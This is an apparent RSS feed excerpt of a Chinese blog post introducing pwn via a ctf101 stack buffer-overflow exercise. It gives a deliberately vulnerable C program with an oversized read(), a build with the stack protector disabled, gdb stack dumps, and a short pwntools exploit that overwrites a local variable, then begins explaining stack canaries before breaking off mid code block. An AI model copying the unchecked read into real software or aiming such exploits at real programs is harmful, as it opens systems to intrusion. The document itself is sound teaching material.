<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>pwn on weakptr's 笔记</title><link>https://nnnewb.github.io/blog/categories/pwn/</link><description>Recent content in pwn on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Thu, 18 Aug 2022 17:52:00 +0800</lastBuildDate><atom:link href="https://nnnewb.github.io/blog/categories/pwn/index.xml" rel="self" type="application/rss+xml"/><item><title>入门pwn</title><link>https://nnnewb.github.io/blog/p/%E5%85%A5%E9%97%A8pwn/</link><pubDate>Thu, 18 Aug 2022 17:52:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E5%85%A5%E9%97%A8pwn/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>经过很长一段时间的学习（理解为浪费时间即可），终于能简单过个 pwn 的 demo 了。于是水一篇博客记录一下。&lt;/p>
&lt;h2 id="准备">准备&lt;/h2>
&lt;p>建立一个 pwn 文件夹做工作区，初始化一个 python 环境，装好 &lt;code>pwntools&lt;/code> ，虽然还不怎么用得到。题目来源是 &lt;a class="link" href="https://ctf101.org/binary-exploitation/buffer-overflow/" target="_blank" rel="noopener"
>ctf101 binary-exploitation buffer-overflow&lt;/a>，源码略做修改。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span class="cp">
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">void&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">volatile&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">secret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x12345678&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">100&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;buffer: %p, secret: %p&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">secret&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">STDIN_FILENO&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buffer&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x100&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// ! dangerous !
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">secret&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mh">0x1234&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;cool!&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">else&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;that&amp;#39;s not cool enough.&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>漏洞行已经标注出。题意比较清楚，通过 &lt;code>read(0,buffer,0x100)&lt;/code> 溢出覆写 &lt;code>secret&lt;/code>，来通过后续的检查。&lt;code>volatile&lt;/code>是为了避免被优化成寄存器变量，不过指定 &lt;code>-O0&lt;/code> 的时候加不加&lt;code>volatile&lt;/code>都无所谓。&lt;/p>
&lt;p>简单写个 &lt;code>Makefile&lt;/code> 编译出 32 和 64 位两个版本，之后也会写两个 exp 。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-makefile" data-lang="makefile">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">all&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="n">question&lt;/span>32 &lt;span class="n">question&lt;/span>64
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">question32&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="n">question&lt;/span>.&lt;span class="n">c&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> gcc $^ -m32 -Wall -Wextra -Wpedantic -fno-stack-protector -g -O0 -o question32
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">question64&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="n">question&lt;/span>.&lt;span class="n">c&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> gcc $^ -Wall -Wextra -Wpedantic -fno-stack-protector -g -O0 -o question64
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>比较重要的是 &lt;code>-fno-stack-protector&lt;/code>，不加的话会在溢出 &lt;code>buffer&lt;/code> 的时候触发 stack canary 检测，直接报 &lt;code>stack smashing detected&lt;/code> 后退出。不过 32 位似乎没这个问题。&lt;/p>
&lt;p>再创建 &lt;code>exploit32.py&lt;/code>和&lt;code>exploit64.py&lt;/code>两个文件用来保存我们的exploit脚本，准备工作就算结束了。&lt;/p>
&lt;h2 id="缓冲区溢出">缓冲区溢出&lt;/h2>
&lt;h3 id="原理">原理&lt;/h3>
&lt;p>引用自 &lt;a class="link" href="https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/stack-based-buffer-overflow" target="_blank" rel="noopener"
>ired.team binary exploitation&lt;/a> ：&lt;/p>
&lt;blockquote>
&lt;p>At a high level, exploiting a buffer overflow boils down to the following key points:&lt;/p>
&lt;ul>
&lt;li>Attacker overflows vulnerable program&amp;rsquo;s memory buffer by writing to it more data (including the malicious code, usually shellcode) than the program anticipated, but did nothing (bound checking) to prevent it from happening;&lt;/li>
&lt;li>When a memory buffer is overflowed, the adjacent memory in the vulnerable program is replaced with malicious content supplied by an attacker;&lt;/li>
&lt;li>Attacker subverts the vulnerable program and forces it to execute the malicious code, which was written to the compromised program&amp;rsquo;s memory, when the program&amp;rsquo;s memory buffer was overflowed;&lt;/li>
&lt;li>The vulnerable program starts executing malicious code, and depending on what the vulnerable program is/what security context it runs in and whether it is being exploited locally or over the network, results in attacker escalating their privileges on an already compromised system or provides them with a remote access to system being exploited.&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;p>简而言之，就是通过覆写内存，操纵程序的控制流，运行攻击者的恶意代码或窃取数据。&lt;/p>
&lt;h3 id="32位栈上缓冲区溢出">32位栈上缓冲区溢出&lt;/h3>
&lt;p>分析案例代码，&lt;code>buffer&lt;/code>和&lt;code>secret&lt;/code>是栈上相邻的变量，从声明顺序盲猜&lt;code>secret&lt;/code>在更接近栈底的位置（高地址），&lt;code>buffer&lt;/code>在更接近栈顶的位置（低地址）。x86体系结构下栈从高地址向低地址增长，&lt;code>&amp;amp;buffer[0]&lt;/code>是栈顶，则&lt;code>&amp;amp;buffer[100]&lt;/code>就是&lt;code>secret&lt;/code>的地址了。&lt;/p>
&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220815163807747.png"
width="269"
height="295"
srcset="https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220815163807747_hu50e363e090a2d910723c71e4f22316ac_35941_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/%E5%85%A5%E9%97%A8pwn/image-20220815163807747_hu50e363e090a2d910723c71e4f22316ac_35941_1024x0_resize_box_3.png 1024w"
loading="lazy"
alt="image-20220815163807747"
class="gallery-image"
data-flex-grow="91"
data-flex-basis="218px"
>&lt;/p>
&lt;p>&lt;code>read(STDIN_FILENO, buffer, 0x100)&lt;/code> 从标准输入读取 &lt;code>0x100&lt;/code> 个字节，从 &lt;code>&amp;amp;buffer[0]&lt;/code> 开始写入。因为边界检查失效（写入长度&lt;code>0x100&lt;/code>大于&lt;code>buffer[100]&lt;/code>长度），只要我们提供 &lt;code>104&lt;/code> 个字节的输入，最后四个字节就会覆盖 &lt;code>secret&lt;/code> 变量的值。&lt;/p>
&lt;p>为了验证上面的说法，可以先创建一个 payload 文件作为 &lt;code>question32&lt;/code> 的输入。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;payload32.bin&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;wb+&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x41&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">104&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>接下来使用 gdb 观察读取输入前后的栈数据。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">Reading symbols from question32...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(gdb) b question.c:8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Breakpoint 1 at 0x1214: file question.c, line 8.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(gdb) b question.c:9
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Breakpoint 2 at 0x122a: file question.c, line 9.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(gdb) r &amp;lt; payload32.bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Starting program: /home/weakptr/repos/pwn/lab-1/question32 &amp;lt; payload32.bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[Thread debugging using libthread_db enabled]
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Using host libthread_db library &amp;#34;/lib/x86_64-linux-gnu/libthread_db.so.1&amp;#34;.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">buffer: 0xffffd058, secret: 0xffffd0bc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Breakpoint 1, main () at question.c:8
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">8 read(STDIN_FILENO, buffer, 0x100);
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(gdb) x/32x $esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd050: 0x00000000 0x00000000 0x00000000 0x00000000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd060: 0x00000000 0x00000000 0x00000000 0x00000000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd070: 0x00000000 0x00000000 0x00000000 0x00000000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd080: 0x00000000 0x00000000 0x00000000 0x00000000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd090: 0x00000000 0x00000000 0x00000000 0x00000000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd0a0: 0x00000000 0x00000000 0x00000000 0x00000000
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd0b0: 0x00000000 0x00000000 0x00000000 *0x12345678*
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd0c0: 0xffffd100 0xf7fbe66c 0xf7fbeb20 0xffffd0f0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(gdb)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>观察第 21 行，&lt;code>0xffffd0bc&lt;/code> 处，&lt;code>0x12345678&lt;/code>，就是 &lt;code>question.c&lt;/code> 中初始化的 &lt;code>secret&lt;/code> 了。而从 &lt;code>0xffffd0508&lt;/code>到&lt;code>0xffffd0bc&lt;/code>就是&lt;code>buffer&lt;/code>的内容。&lt;/p>
&lt;p>我们继续执行到 &lt;code>read&lt;/code> 这一行后。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(gdb) next
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Breakpoint 2, main () at question.c:9
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">9 if (secret == 0x1234) {
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(gdb) x/32x $esp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd050: 0x00000000 0x00000000 0x41414141 0x41414141
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd060: 0x41414141 0x41414141 0x41414141 0x41414141
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd070: 0x41414141 0x41414141 0x41414141 0x41414141
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd080: 0x41414141 0x41414141 0x41414141 0x41414141
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd090: 0x41414141 0x41414141 0x41414141 0x41414141
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd0a0: 0x41414141 0x41414141 0x41414141 0x41414141
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd0b0: 0x41414141 0x41414141 0x41414141 *0x41414141*
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0xffffd0c0: 0xffffd100 0xf7fbe66c 0xf7fbeb20 0xffffd0f0
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">(gdb) p /x secret
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$2 = 0x41414141
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>观察到 &lt;code>secret&lt;/code> 被覆盖为 &lt;code>0x41414141&lt;/code>。&lt;/p>
&lt;p>现在只需要把 payload32.bin 中最后四个字节改成预期的 &lt;code>secret&lt;/code> 值 &lt;code>0x1234&lt;/code> 即可。&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">pwn&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">struct&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">proc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pwn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">process&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./question32&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">b&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">struct&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">pack&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;@l&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1234&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">proc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x41&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">100&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">b&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">proc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">()&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">())&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>结果：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-plaintext" data-lang="plaintext">&lt;span class="line">&lt;span class="cl">(.venv) vm :: repos/pwn/lab-1 » python exploit32.py
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[+] Starting local process &amp;#39;./question32&amp;#39;: pid 640653
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">[*] Process &amp;#39;./question32&amp;#39; stopped with exit code 0 (pid 640653)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">buffer: 0xffc0bf88, secret: 0xffc0bfec
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cool!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="64位栈上缓冲区溢出">64位栈上缓冲区溢出&lt;/h3>
&lt;p>x86-64架构下的栈上缓冲区溢出和 32 位架构有所不同，主要区别在于 64位 ELF 多了很多保护机制，直接影响栈上缓冲区溢出的就有 stack canary。&lt;/p>
&lt;h4 id="stack-canary">stack canary&lt;/h4>
&lt;p>关于 stack canary 机制的解释摘录如下。&lt;/p>
&lt;blockquote>
&lt;p>Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately.&lt;/p>
&lt;/blockquote>
&lt;p>尝试让 gcc 吐出带 canary 的汇编如下，命令 &lt;code>gcc -S question.c -g -O0 -fstack-protector -o question64.s&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">main:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> endbr64
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> pushq %rbp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq %rsp, %rbp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> addq $-128, %rsp
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq %fs:40, %rax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq %rax, -8(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xorl %eax, %eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movl $305419896, -116(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -112(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -104(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -96(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq $0, -88(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> // 略
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movl $0, %eax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq -8(%rbp), %rdx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> subq %fs:40, %rdx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> je .L5
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> call __stack_chk_fail@PLT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.L5:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> leave
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ret
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>在函数序言部分多出了几条指令：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"> movq %fs:40, %rax
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> movq %rax, -8(%rbp)
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> xorl %eax, %eax
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>而末尾返回之前多了一条判断：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
